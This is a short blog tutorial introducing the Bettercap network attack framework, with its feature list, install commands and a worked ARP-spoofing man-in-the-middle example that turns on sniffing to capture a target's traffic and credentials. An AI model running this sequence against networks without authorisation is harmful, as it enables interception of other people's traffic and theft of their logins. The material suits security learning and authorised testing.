---
title: "Bettercap"
date: 2022-07-02T18:16:26Z
draft: false
author: "Dark-Kernel"
post_image: "https://www.bettercap.org/logo.png"
---

## Bettercap Framework


Bettercap is a powerfull, easily extensible and portable framework written in Go which aims to offer to security researches, redteamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices and IPv4/IPv6 networks.

![bettercap_pic](https://www.bettercap.org/logo.png)

                   
 ## Main Features

 * **WiFi** networks scanning, [deauthentication attack](https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/), [clientless PMKID association attack](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/) and automatic WPA/WPA2 client handshakes capture.
* **Bluetooth Low Energy** devices scanning, characteristics enumeration, reading and writing.
* 2.4Ghz wireless devices scanning and **MouseJacking** attacks with over-the-air HID frames injection (with DuckyScript support).
* Passive and active IP network hosts probing and recon.
* **ARP, DNS, NDP and DHCPv6 spoofers** for MITM attacks on IPv4 and IPv6 based networks.
* **Proxies at packet level, TCP level and HTTP/HTTPS** application level fully scriptable with easy to implement **javascript plugins**.
* A powerful **network sniffer** for **credentials harvesting** which can also be used as a **network protocol fuzzer**.
* A very fast port scanner.
* A powerful [REST API](https://www.bettercap.org/modules/core/api.rest/) with support for asynchronous events notification on websocket to orchestrate your attacks easily.
* **A very convenient [web UI](https://www.bettercap.org/usage/#web-ui).**


Get More infomation on their official website [More!](https://www.bettercap.org/modules/)


## Installation

To install bettercap use the following commands:

~ Arch

	sudo pacman -S bettercap

~ Kali

	sudo apt install bettercap

~ Others use their official repository

	https://github.com/bettercap/bettercap


## Basic stuffs


First fireup you bettercap on terminal

	sudo bettercap

![bettercap_start](/btr_start.png)



Search devices on your network

	net.probe on

	net.show

  

You can perform MITM attack also 
### Example

	set arp.spoof.fullduplex true

 	set arp.spoof.targets <target ip>

 	arp.spoof on

 	net.sniff on


Now you will get all the data where the target visits. including the credentials.



# 
# **We can use web view also**

   1. First install ui

 	ui.update

   2. Then 

 	https-ui

 Now you will get a link visit that page and explore.


        
# **Thanks for reading.**

